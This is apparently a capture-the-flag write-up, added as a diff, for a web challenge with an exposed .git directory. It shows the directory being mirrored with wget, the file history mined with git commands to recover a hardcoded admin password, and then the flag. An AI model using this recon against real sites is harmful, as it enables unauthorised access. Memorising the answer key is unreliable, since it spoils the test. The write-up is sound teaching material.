@@ -1,0 +1,108 @@
+title: xp0sed
+id: 1061
+category: Web
+difficulty: Easy
+content: |
+  **Author**: [Yadhu Krishna](https://twitter.com/yadhukrishna_)
+
+  #### Analysis
+
+  Upon opening the challenge, we are greeted with a login page and the credentials are not given. However, the given hint [leads us](https://stackoverflow.com/a/3082452) to `.git` directory at `http://HOST:PORT/.git/`.  
+
+  ```
+  Index of /.git
+      
+  [ICO]	Name	Last modified	Size	Description
+  [PARENTDIR]	Parent Directory	 	-	 
+  [   ]	COMMIT_EDITMSG	2021-12-28 08:12	34	 
+  [   ]	HEAD	2021-12-28 08:12	23	 
+  [DIR]	branches/	2021-12-28 08:12	-	 
+  [   ]	config	2021-12-28 08:12	92	 
+  [   ]	description	2021-12-28 08:12	73	 
+  [DIR]	hooks/	2021-12-28 08:12	-	 
+  [   ]	index	2021-12-28 08:12	209	 
+  [DIR]	info/	2021-12-28 08:12	-	 
+  [DIR]	logs/	2021-12-28 08:12	-	 
+  [DIR]	objects/	2021-12-28 08:12	-	 
+  [DIR]	refs/	2021-12-28 08:12	-	
+      
+  Apache/2.4.51 (Debian) Server at HOST Port PORT
+  ```
+
+  #### Exploiting
+
+  Now we have a fully accessible `.git` directory. The exposed directory can be recursively cloned using 
+
+  ```bash
+  wget -r http://HOST:PORT/.git/ 
+  ```
+
+  This command clones all the files in the .git directory to local computer. This cloned directory is a valid git directory and contains all the information about commits, history, remote repository address, etc.
+
+  Upon checking the status of the repository using `git status` command, we find that `index.php` has been deleted. The deleted `index.php` file can be restored with `git restore` command. 
+
+  We can now find the username from `index.php`, however, the password appears to be hashed.
+
+  ```php
+  <?php
+  $msg = "";
+
+  if(isset($_POST['password'], $_POST['username'])) {
+          if(md5($_POST['password']) === "bf639e280ec7f346362c7fa2f00d2ca5" && $_POST['username'] === "system_admin")
+          {
+                  die($_ENV["the_flag"]);
+          }  else {
+                  $msg = "Wrong username or password.";
+          } 
+  }
+  ?>
+  ```
+
+  Upon checking the commit history with `git log` command, we find there are 3 commits.
+
+  ```
+  commit 8c722b69146bcdca516488e17a76447e44132c7a (HEAD -> master)
+  Author: Challenge Author <webm4ster@internal.domain>
+  Date:   Tue Dec 28 08:12:42 2021 +0000
+
+      Fixed security issue in index.php
+
+  commit f35ed578722f2ca5d0aaf5f8a4435d49dd0030d4
+  Author: Challenge Author <webm4ster@internal.domain>
+  Date:   Tue Dec 28 08:12:42 2021 +0000
+
+      Added Style.css
+
+  commit 6e672df7e870349b61df637122b0871816d612f2
+  Author: Challenge Author <webm4ster@internal.domain>
+  Date:   Tue Dec 28 08:12:42 2021 +0000
+
+      Just getting started
+  ```
+
+  We see that there is a commit with ID `8c722b69146bcdca516488e17a76447e44132c7a` that mentions about a security issue that was fixed. 
+
+  We can revert back to the first commit using `git checkout 6e672df7e870349b61df637122b0871816d612f2` command. (Note that the ID given is that of the first commit.)
+
+  Now let us check the source code of `index.php`. This gives us the username and password of the application. 
+
+  ```php
+  <?php
+  $msg = "";
+
+  if(isset($_POST['password'], $_POST['username'])) {
+          if($_POST['password'] === "Ius3UnGu3ssBLEP@s5w0rDs" && $_POST['username'] === "system_admin")
+          {
+                  die($_ENV["the_flag"]);
+          }  else {
+                  $msg = "Wrong username or password.";
+          } 
+  }
+  ?>
+  ```
+
+  Upon logging in with these credentials, we get the flag.
+
+  **Flag**: inctfj{d0nt_xp0sE_ur_g1ts}
+
+  
